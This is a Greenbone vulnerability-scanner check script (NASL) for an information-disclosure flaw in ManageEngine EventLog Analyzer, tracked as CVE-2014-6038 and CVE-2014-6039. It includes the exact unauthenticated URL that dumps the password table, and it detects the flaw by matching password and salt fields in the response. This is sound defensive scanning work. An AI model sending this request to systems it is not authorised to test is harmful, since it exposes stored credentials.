# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zohocorp:manageengine_eventlog_analyzer";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105111");
  script_cve_id("CVE-2014-6038", "CVE-2014-6039");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("2021-10-15T11:02:56+0000");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ManageEngine EventLog Analyzer Multiple Vulnerabilities");

  script_xref(name:"URL", value:"https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_eventlog_info_disc.txt");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker read usernames and passwords.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"affected", value:"All versions from v7 to v9.9 build 9002.");

  script_tag(name:"summary", value:"ManageEngine EventLog Analyzer is prone to an information disclosure vulnerability.");

  script_tag(name:"last_modification", value:"2021-10-15 11:02:56 +0000 (Fri, 15 Oct 2021)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-03-26 14:15:00 +0000 (Thu, 26 Mar 2020)");
  script_tag(name:"creation_date", value:"2014-11-06 16:38:34 +0100 (Thu, 06 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_manageengine_eventlog_analyzer_detect.nasl");
  script_mandatory_keys("manageengine/eventlog_analyzer/http/detected");
  script_require_ports("Services/www", 8400);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/agentHandler?mode=getTableData&table=AaaPassword";

if (http_vuln_check(port: port, url: url, pattern: "AaaPassword createdtime",
                    extra_check: make_list("password", "password_id", "salt"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
